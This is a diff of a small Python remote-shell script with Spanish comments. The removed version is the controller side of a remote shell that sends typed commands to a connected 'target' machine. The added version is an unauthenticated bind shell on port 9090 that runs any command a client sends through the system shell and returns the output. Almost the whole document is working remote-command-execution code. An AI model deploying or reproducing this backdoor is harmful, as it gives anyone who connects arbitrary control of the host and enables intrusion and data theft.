@@ -1,55 +1,73 @@
-import socket 
-import os
+import socket
 import subprocess
+import os
 
-
-def shell():
-    current_dir = target.recv(3000)
+def handle_commands():
+    # Obtener el directorio actual del servidor y enviarlo al cliente
+    current_dir = os.getcwd()
+    client_socket.send(current_dir.encode("utf-8"))
 
     while True:
-        command = input(f"{current_dir}-#: ").encode("utf-8")
-        if command.decode("utf-8") == "exit":
+        # Recibir el comando del cliente
+        command = client_socket.recv(3000).decode("utf-8")
+        
+        # Si el cliente envía "exit", cerrar la conexión
+        if command.lower() == "exit":
+            print("Conexión cerrada por el cliente.")
             break
-        elif command.decode("utf-8").find("cd") == 0:
-            target.send(command)
-            res = target.recv(3000)
-            current_dir = res
+
+        # Si es un comando para cambiar de directorio (cd)
+        elif command.startswith("cd"):
+            try:
+                # Cambiar al nuevo directorio
+                os.chdir(command[3:])
+                new_dir = os.getcwd()
+                client_socket.send(new_dir.encode("utf-8"))
+            except FileNotFoundError as e:
+                # Enviar error si el directorio no existe
+                client_socket.send(f"Error: {str(e)}".encode("utf-8"))
+
+        # Si el comando es ejecutar un programa en Python
+        elif command == "run python hello":
+            try:
+                # Ejecutar el programa que imprime "Hola Mundo"
+                result = subprocess.run(['python3', '-c', 'print("Hola Mundo")'], capture_output=True, text=True)
+                client_socket.send(result.stdout.encode("utf-8"))
+            except Exception as e:
+                client_socket.send(f"Error al ejecutar: {str(e)}".encode("utf-8"))
+
+        # Para otros comandos, ejecutarlos en la shell del sistema
         else:
             try:
-                target.send(command)
-                res = target.recv(3000)
-                if res == 1:
-                    continue
-                elif command.decode("utf-8") == "":
-                    pass
-                else:
-                    print(res.decode("utf-8"))
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                # Enviar el resultado de la ejecución al cliente
+                client_socket.send(result.stdout.encode("utf-8") + result.stderr.encode("utf-8"))
+            except Exception as e:
+                client_socket.send(f"Error al ejecutar: {str(e)}".encode("utf-8"))
 
-            except:
-                print("ocurrio un error con el comando insertado")
-                pass
+def config_server():
+    global client_socket
 
-def config():
-    global server
-    global target
-    global ip 
-    global port
+    # Crear el socket del servidor
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    ip = "192.168.1.12"
-    port = 9090
+    # Detectar la IP local automáticamente y asignar un puerto
+    ip = socket.gethostbyname(socket.gethostname())
+    server_socket.bind((ip, 9090))  # Puedes cambiar 9090 por otro puerto si lo prefieres
 
-    server.bind((ip, port))
+    # Esperar conexiones entrantes
+    server_socket.listen(1)
+    print(f"Servidor iniciado en IP {ip}, puerto 9090. Esperando conexiones...")
 
-    server.listen(5)
-    print("servidor iniciado, esperando conecciones...")
+    # Aceptar la conexión del cliente
+    client_socket, client_address = server_socket.accept()
+    print(f"Conexión establecida con {client_address}")
 
-    while True:
-        target, addr = server.accept()
-        print("coneccion iniciada", addr)
-        break
+    # Manejar los comandos recibidos del cliente
+    handle_commands()
 
+    # Cerrar la conexión
+    client_socket.close()
 
-config()
-shell()
-target.close()
+# Configurar y ejecutar el servidor
+config_server()
